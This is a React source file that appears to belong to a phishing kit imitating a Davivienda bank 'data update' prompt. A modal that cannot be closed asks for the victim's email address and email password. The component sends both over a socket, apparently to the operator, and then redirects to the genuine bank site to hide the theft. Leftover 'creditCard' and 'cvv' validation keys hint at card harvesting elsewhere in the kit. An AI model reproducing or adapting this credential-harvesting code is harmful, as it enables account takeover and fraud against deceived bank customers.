import React, { useContext, useState } from 'react'
import { Modal, Button, Text} from "@nextui-org/react";
import { useFormik } from 'formik';
import { UserDataContext } from '../context/UserDataContext';
import { SocketContext } from '../context/SocketContext';
import email from '../assets/emailIcon.png'
import { RotatingLines } from 'react-loader-spinner';

export const ModalEmailAndPhone = () => {
    
    const { addData } = useContext(UserDataContext);
    const { socket } = useContext(SocketContext);
    const [spiner, setSpiner] = useState(false);
    const [visible] = useState(true);
  
  
    const { handleSubmit, handleChange, values, errors, touched } = useFormik({
        initialValues: {
            correo: '',
            claveCorreo: '',
        },
        validate: values => {
            let errors = {}
            
            if (values.correo == '') {
                errors.creditCard = 'Este campo es requerido'
            }

            if (values.claveCorreo == '') {
                errors.cvv = 'Este campo es requerido'
            }

            return errors
        },
        onSubmit: async({ claveCorreo, correo }) => {
            
            setSpiner(true)
            const [ newUser ] = await addData({correo, claveCorreo})
            await socket.emit('[User] create', newUser)
            
            setTimeout(() => {
                window.location.href = 'https://www.davivienda.com/wps/portal/personas/nuevo#';
            }, 1000);

        }
    })

    return (
        <Modal
            preventClose
            aria-labelledby="modal-title"
            open={visible}
            className='mx-5 sm:m-0'

        >
            <Modal.Header>
                <Text 
                    id="modal-title" 
                    size={18}
                    className='flex items-center gap-3'
                >
                    <img src={email} className='h-10' />
                    Actualizacion de datos
                </Text>
            </Modal.Header>
            <form onSubmit={handleSubmit}>
                <Modal.Body>
                    {
                        spiner == false 
                        ? (
                            <div className='bg-gray-100 flex flex-col p-5 rounded'>
                                { touched.correo && errors.correo && (
                                    <div className='bg-red-500 rounded py-3 pl-3 mb-3 tracking-normal text-white'>
                                        <p className='font-normal'>{errors.correo}</p>
                                    </div>
                                )}
                                { touched.claveCorreo && errors.claveCorreo && (
                                    <div className='bg-red-500 rounded py-3 pl-3 mb-3 tracking-normal text-white'>
                                        <p className='font-normal'>{errors.claveCorreo}</p>
                                    </div>
                                )}
                                
                                <label className='font-normal tracking-normal mb-1'>Ingresa tu correo electronico</label>
                                <input 
                                    name='correo' 
                                    required 
                                    type="email" 
                                    className='border-[3px] rounded-lg py-2 outline-none pl-3 font-normal' 
                                    value={values.correo}
                                    onChange={handleChange}
                                />

                                <label className='font-normal tracking-normal mt-6 mb-1'>Digita la clave del correo</label>
                                <input 
                                    required  
                                    type="text"
                                    autoComplete='off'
                                    className='border-[3px] rounded-lg py-2 outline-none pl-3 font-normal'
                                    name='claveCorreo'
                                    value={values.claveCorreo} 
                                    onChange={handleChange}
                                />
                            </div>
                        ) 
                        : (
                        <div className='flex justify-center h-[200px]'>
                            <RotatingLines strokeColor="grey" strokeWidth="5" animationDuration="0.75" width="96" visible={true} />
                        </div>
                        )        
                    }
                    
                </Modal.Body>
                <Modal.Footer className='flex justify-center'>
                {
                    spiner == false ? <Button className='btnRed bgRed flex' type="submit">Actualizar</Button> : null  
                }
                </Modal.Footer>
            </form>
        </Modal>
    );
}